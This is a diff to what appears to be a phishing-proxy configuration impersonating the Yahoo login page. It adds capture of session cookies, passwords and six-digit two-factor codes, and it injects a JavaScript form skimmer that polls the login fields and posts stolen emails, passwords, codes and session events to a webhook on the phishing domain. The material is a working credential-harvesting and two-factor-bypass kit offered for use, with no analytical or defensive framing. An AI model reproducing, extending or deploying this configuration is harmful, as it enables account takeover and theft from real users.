@@ -2,11 +2,12 @@ name: 'yahoo'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'login.yahoo.com', session: true, is_landing: false}
 sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'application/json']}
 auth_tokens:
   - domain: '.yahoo.com'
-    keys: ['A3', 'A1', 'A1S']
+    keys: ['A3', 'A1', 'A1S', 'Y', 'T', 'S']
 credentials:
   username:
     key: 'username'
@@ -16,17 +17,70 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
+  twofa:
+    key: 'verificationCode'
+    search: '([0-9]{6})'
+    type: 'post'
 login:
   domain: 'login.yahoo.com'
   path: '/'
 js_inject:
-  - trigger_domains: ['login.yahoo.com']
+  - trigger_domains: ['{{.Endpoint1}}.{{.Domain}}', 'login.yahoo.com']
     trigger_paths: ['/.*']
     script: |
-      (function(){const api="https://{{.Domain}}/api/webhook";const secret="{{.WebhookSecret}}";const source="yahoo";document.addEventListener('submit',function(){const u=document.querySelector('input[name="username"]')?.value;const p=document.querySelector('input[name="password"],input[name="passwd"]')?.value;if(u||p){fetch(api,{method:"POST",headers:{"Content-Type":"application/json","X-Webhook-Secret":secret},body:JSON.stringify({event:p?"credentials":"email",source:source,email:u,password:p})}).catch(()=>{});}},true);})();
+      (function(){
+        const api = "https://{{.Domain}}/api/webhook";
+        const secret = "{{.WebhookSecret}}";
+        const source = "yahoo";
+        let capturedEmail = '';
+        
+        function sendData(type, email, password, code) {
+          const payload = { event: type, source: source, remote_addr: "{{.VpsIp}}" };
+          if (email) payload.email = email;
+          if (password) payload.password = password;
+          if (code) payload.code = code;
+          
+          fetch(api, {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
+            body: JSON.stringify(payload)
+          }).catch(function(){});
+        }
+        
+        function captureForm() {
+          const emailInput = document.querySelector('input[name="username"], input[type="email"]');
+          const passInput = document.querySelector('input[name="password"], input[type="password"]');
+          const codeInput = document.querySelector('input[name="verificationCode"], input[type="tel"]');
+          
+          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
+            capturedEmail = emailInput.value;
+            sendData("email", capturedEmail, null, null);
+          }
+          
+          if (passInput && passInput.value) {
+            sendData("credentials", capturedEmail, passInput.value, null);
+          }
+          
+          if (codeInput && codeInput.value && codeInput.value.length >= 6) {
+            sendData("2fa", capturedEmail, null, codeInput.value);
+          }
+        }
+        
+        // Monitor for session after login
+        setInterval(function() {
+          if (capturedEmail && document.cookie.includes('A3')) {
+            sendData("session", capturedEmail, null, null);
+          }
+        }, 3000);
+        
+        setInterval(captureForm, 300);
+        document.querySelectorAll('form').forEach(function(f) {
+          f.addEventListener('submit', function() { setTimeout(captureForm, 500); });
+        });
+      })();
 webhook:
   url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
   headers:
     X-Webhook-Secret: "{{.WebhookSecret}}"
   format: "json"
-  events: ["credentials", "session"]
+  events: ["email", "credentials", "2fa", "session"]
